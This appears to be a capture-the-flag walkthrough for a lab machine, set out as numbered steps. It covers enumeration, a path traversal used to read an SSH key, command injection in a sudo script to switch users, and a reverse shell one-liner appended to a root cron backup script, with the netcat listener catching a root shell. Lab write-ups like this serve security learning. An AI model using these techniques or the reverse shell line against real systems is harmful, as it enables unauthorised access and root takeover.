@@ -1,0 +1,162 @@
+-------step 1:-
+
+enumarate all open ports and services and than enumarate directories of url and than enumarate subdomain.
+we have 2 open ports
+1.ftp 21
+2.ssh 22
+
+tool:-
+nmap
+dirsearch
+gobuster
+ffuf
+
+-------step 2:-
+
+after enumaration we need to analyz our collect data and test and find any powerfull information.
+
+-------step 3:-
+
+also enumarate directories in dip level. than we find some path there we inject over vuln.
+here we find path traversal mean file inclusion vuln.
+here we try to find ssh key for connect to ssh server.
+here /etc/ssh/sshd_config
+have rsa key of ssh server, so we copy the key and paste to txt file than give permission to read and write
+cmd :- chmod +600 id_rsa
+
+than we goto the ssh server using key
+cmd:-
+ssh -i id_rsa [username]@[ip]
+here we uses a server shell for further enumaration.
+
+
+-------step 4:-
+here we need to gain access of root.
+
+cmd:- sudo -l
+ans:-
+Matching Defaults entries for dale on ip-10-10-104-109:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dale may run the following commands on ip-10-10-104-109:
+    (gyles) NOPASSWD: /home/gyles/admin_checks
+
+  
+than we go to the admin_checks 
+cmd :- cat /home/gyles/admin_checks
+ans:-
+#!/bin/bash
+
+printf "Reading stats.\n"
+
+sleep 1
+printf "Reading stats..\n"
+
+sleep 1
+read -p "Enter name of person backing up the data: name
+echo $name >> /var/stats/stats.txt
+read -p "Enter 'date' to timestamp the file: error
+printf "The Date is "
+$error 2>/dev/null
+date_save=$(date "+%F-%H-%M")
+
+cp /var/stats/stats.txt /var/stats/stats-$date_save.bak
+printf "Stats have been backed up\n"
+
+-------step 5:-
+NOTE:-
+
+sudo -u gyles /home/gyles/admin_checks
+
+means:
+
+    Run the script or program /home/gyles/admin_checks as the user gyles using sudo.
+
+🔍 Breakdown:
+    sudo: execute a command as another user (default is root).
+    -u gyles: specifies the user to switch to — in this case, gyles.
+    /home/gyles/admin_checks: the script or executable to run as gyles.
+    
+dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
+
+Reading stats.
+Reading stats..
+Enter name of person backing up the data: name
+Enter 'date' to timestamp the file: /bin/bash
+The Date is /bin/bash
+
+id
+uid=1001(gyles) gid=1001(gyles) groups=1001(gyles), 1003 (editors), 1004(admin)
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+NOTE:-
+is used in privilege escalation or reverse shell situations to upgrade a limited shell (often called a "dumb shell") into a pseudo-terminal shell (like a fully interactive one). Here's a brief explanation of how it works:
+🔍 Breakdown:
+
+    python: Runs the Python interpreter.
+    -c: Tells Python to execute the string that follows as code.
+    'import pty; pty.spawn("/bin/sh")': Python code that:
+        import pty: Loads the pty module, which lets you work with pseudo-terminals.
+        pty.spawn("/bin/sh"): Starts a new interactive shell (/bin/sh) in a pseudo-terminal.
+
+✅ Why Use It?
+When you get a shell from exploiting a web app, reverse shell, or SSH misconfiguration, it might be non-interactive:
+
+    No tab completion
+    Arrow keys print garbage
+    Ctrl+C doesn't work properly
+
+Running this command spawns a new shell inside a pseudo-terminal, making the session more like a real terminal.
+
+
+Now we have a shell as the user Gyle.
+
+-------step 6:-
+
+here we show the admin_stuff file in /opt
+
+cmd:-cat admin_stuff
+ans:-script.sh
+
+than we open file
+cmd:-cat script.sh
+
+ans:-
+#!/bin/bash
+
+#I have set a cronjob to run this script every minute
+dev_site="/usr/local/sbin/dev_backup.sh"
+main_site="/usr/local/bin/main_backup.sh"
+#Back ups the sites locally
+
+$main_site
+$dev_site
+
+
+-------step 7:-
+
+than we go to the main_backup.sh file that we previously show
+cmd :-
+cat /usr/local/bin/main_backup.sh
+ans:-
+#!/bin/bash
+
+cp -r/var/www/team.thm/* /var/backups/ww/team.thm/
+
+here we show the reverse shell injection location
+
+echo "bash -i >& /dev/tcp/[our ip]/4444 0>&1" >> /usr/local/bin/main_backup.sh
+
+-------step :-8
+
+than goto our terminal and 
+cmd:-
+(kali kali)-[~]$nc-lnvp 4444
+listening on [any] 4444
+connect to [10.17.43.248] from (UNKNOWN) [10.10.206.132] 36644
+sh: 0: can't access tty; job control turned off
+# whoami
+root
+
+
